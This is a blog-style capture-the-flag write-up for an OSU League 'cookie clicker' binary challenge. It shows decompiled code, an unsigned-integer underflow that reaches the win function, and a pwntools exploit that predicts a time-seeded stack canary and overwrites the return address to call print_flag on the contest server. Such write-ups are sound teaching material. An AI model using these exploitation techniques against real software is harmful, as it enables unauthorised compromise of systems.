---
title: "OSU League 2020/2021 - Cookie Writeup"
date: 2021-01-16
draft: false
description: ""
tags: ["ctf"]
---
## Writeup
> pls beat the game

In this challenge, we are given a command line game of cookie clicker! Running the binary we see the game:

```
COOKIES: 50000
GRANDMAS: 0
COOKIES PER SECOND: 0
WIN CONDITION: 18000000000000000000 COOKIES

MENU: 
1. Bake 100 cookies
2. Hire a grandma to bake 100 cookies per second [COST 1000 COOKIES]
3. Improve your baking rate by +100 cookies per click [COST 1000 COOKIES]
4. Improve your grandmas baking rate by +100 cookies per second [COST 1000 COOKIES]

Enter any key to refresh
```

So it looks like we start out with 50,000 cookies, and we need to get to 18,000,000,000,000,000,000. Given the ways we can get more cookies, to actually win this game correctly is nearly impossible, so let's see if we can exploit it.

To start, let's open the program in Ghidra to see how the program works.

```c++
undefined8 main(EVP_PKEYCTX *param_1){
	pthread_t local_38;
	pthread_t local_30;
	undefined8 local_28;
	undefined8 local_20;
	undefined8 local_18;
	undefined8 local_10;

	init(param_1);
	local_28 = 50000;
	local_18 = 100;
	local_10 = 1;
	local_20 = 0;
	pthread_create(&local_38, (pthread_attr_t *)0x0, io_loop, &local_28);
	pthread_create(&local_30, (pthread_attr_t *)0x0, grandma_loop, &local_28);
	pthread_join(local_38,(void **)0x0);
	pthread_join(local_30,(void **)0x0);
	win();
	return 0;
}
```

Here we can see that our program is split into two threads. One is the `io_loop`, and the other is the `grandma_loop`.  We see that once those threads are finished, they are joined back together and then the `win` function is called. So in order for `win` to be called, we need to have our threads be able to exit.  Let's look at the `io_loop`:

```c++
void io_loop(ulong *param_1){

  undefined8 uVar1;
  long lVar2;
  char local_9;
  
  while (*param_1 < 18000000000000000000) {
    usleep(25000);
    clear();
    printf("\rCOOKIES: %lu\n",*param_1);
    printf("GRANDMAS: %lu\n",param_1[1]);
    printf("COOKIES PER SECOND: %lu\n",param_1[3] * param_1[1] * 100,param_1[3] * param_1[1] * 0x14);
    printf("WIN CONDITION: %lu COOKIES\n\n",18000000000000000000);
    puts("MENU: ");
    printf("1. Bake %lu cookies\n",param_1[2]);
    uVar1 = cost(param_1);
    printf("2. Hire a grandma to bake %lu cookies per second [COST %lu COOKIES]\n",param_1[3] * 100,uVar1,uVar1);
    uVar1 = cost(param_1);
    printf("3. Improve your baking rate by +100 cookies per click [COST %lu COOKIES]\n",uVar1);
    uVar1 = cost(param_1);
    printf("4. Improve your grandmas baking rate by +100 cookies per second [COST %lu COOKIES]\n\n",uVar1);
    puts("Enter any key to refresh");
    __isoc99_scanf(&DAT_004012f6,&local_9);
    fflush(stdin);
    if (local_9 == '2') {
		lVar2 = cost(param_1);
		*param_1 = *param_1 - lVar2;
		param_1[1] = param_1[1] + 1;
    }
    else {
		if (local_9 < '3') {
			if (local_9 == '1') {
				*param_1 = *param_1 + param_1[2];
			}
		}
		else {
			if (local_9 == '3') {
				lVar2 = cost(param_1);
				*param_1 = *param_1 - lVar2;
				param_1[2] = param_1[2] + 100;
			}
			else {
				if (local_9 == '4') {
					lVar2 = cost(param_1);
					*param_1 = *param_1 - lVar2;
					param_1[3] = param_1[3] + 1;
				}
			}
		}		
	}
  }
  return;
}
```

Our `param_1` is the current amount of cookies we have.  We start out with 50,000 cookies, and our cookies get added and subracted from that. But wait a minute, notice how when we are subtracting from our total, there is no check to make sure that our result isn't negative:
```c++
if (local_9 == '3') {
	lVar2 = cost(param_1);
	*param_1 = *param_1 - lVar2;
	param_1[2] = param_1[2] + 100;
}
```

So if we have 0 cookies, and we subtract from our total number of cookies, what happens? Let's find out:

```
COOKIES: 0
GRANDMAS: 0
COOKIES PER SECOND: 0
WIN CONDITION: 18000000000000000000 COOKIES

MENU: 
1. Bake 5100 cookies
2. Hire a grandma to bake 100 cookies per second [COST 1000 COOKIES]
3. Improve your baking rate by +100 cookies per click [COST 1000 COOKIES]
4. Improve your grandmas baking rate by +100 cookies per second [COST 1000 COOKIES]

Enter any key to refresh
As a reward for beating cookie clicker, I will turn this into an easy buffer overflow challenge. Enter your payload!
```

Woah! We called the win function, but how?  Well, we can probably assume that our variable for our total number of cookies was unsigned, meaning it can only be represented by a positive number.  So when we subract from it when our total is at 0, rather than going negative, the total wraps around and underflows to a super large number.  That number is larger than 18,000,000,000,000,000,000, so the loop exits, and so does the thread.  The `grandpa_loop` function also exits as it's just a while loop that exits when we are above the target number as well! With both threads exited, the win function is called.

What's next?  Well, we are directly told that the next part is an easy buffer overflow challenge, so let's overflow a buffer:

```
COOKIES: 0
GRANDMAS: 0
COOKIES PER SECOND: 0
WIN CONDITION: 18000000000000000000 COOKIES

MENU: 
1. Bake 5100 cookies
2. Hire a grandma to bake 100 cookies per second [COST 1000 COOKIES]
3. Improve your baking rate by +100 cookies per click [COST 1000 COOKIES]
4. Improve your grandmas baking rate by +100 cookies per second [COST 1000 COOKIES]

Enter any key to refresh
As a reward for beating cookie clicker, I will turn this into an easy buffer overflow challenge. Enter your payload!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
1094795585 != 1526204186
STACK COOKIE MODIFIED, STACK OVERFLOW DETECTED.
EXTREME SECURITY MEASURES ACTIVATED, SHUTTING DOWN POWER TO AWS-WEST
```

Interesting, rather than a segfault, the program was able to notice that we overflowed the buffer and exited accordingly. Let's take a deeper look by examining the source code for `win()`

```c++
void win(void){
	char local_28 [28];
	uint local_c;

	flush();
	local_c = stack_cookie;
	puts(
		"As a reward for beating cookie clicker, I will turn this into an easy buffer overflow challenge. Enter your payload!"
	);
	fgets(local_28,100,stdin);
	if(local_c != stack_cookie){
		printf("%d != %d\n",(ulong)local_c,(ulong)stack_cookie);
		puts("STACK COOKIE MODIFIED, STACK OVERFLOW DETECTED.");
		puts("EXTREME SECURITY MEASURES ACTIVATED, SHUTTING DOWN POWER TO AWS-WEST");

		exit(-1);
	}
	return;
}
```

So what this win function is doing is: It creates a buffer of 28 bytes on the stack, followed by an integer which gets set to `stack_cookie`.  This variable is created using `rand()` seeded with the current time.  The program then reads 100 bytes into the 28 bytes buffer (which allows us to write past the buffer), but then it checks to see if the stack_cookie was modified. If it was, then the program exits.

We need to somehow know the stack_cookie in order to overwrite EIP. Since we know that `rand()` was seeded with the current time, we can actually predict what the cookie is going to be by using the same rand function and seeding it with the current time in our exploit script.  Let's set that up, while also automating the underflow portion of the challenge.

```python
from pwn import *
from ctypes import CDLL

io = remote('ctf.ropcity.com', 31310)
#io = process('./cookie')

t = int(time.time())
libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')

libc.srand(t) #seed with current time

canary = libc.rand()

for i in range((50000/1000)+1):
    io.sendline('3')

io.recvuntil('payload!)

io.interactive()
```

Now we just need to do the buffer overflow.  The format should be:  
`28 byte buffer + canary + EBP + EIP` 

What should we jump to? Well, probably the funtion called `print_flag()'

```
0x0000000000400e9b  print_flag
```

So our final script will look like:

```python
from pwn import *
from ctypes import CDLL

io = remote('ctf.ropcity.com', 31310)
#io = process('./cookie')

t = int(time.time())
libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')

libc.srand(t)

canary = libc.rand()

for i in range((50000/1000)+1):
    io.sendline('3')

io.recvuntil('payload!')

exploit = b'A' * 28
exploit += p64(canary)
exploit += b'AAAA' #align the stack
exploit += p64(0x400e9b)*50

io.sendline(exploit)
```

And running it we get the flag!

```
$ python2 exploit.py
[+] Opening connection to ctf.ropcity.com on port 31310: Done
[*] Switching to interactive mode

osu{LAnC3_3a7s_0AtM3AL_ra1s1n}
```

A great challenge :)
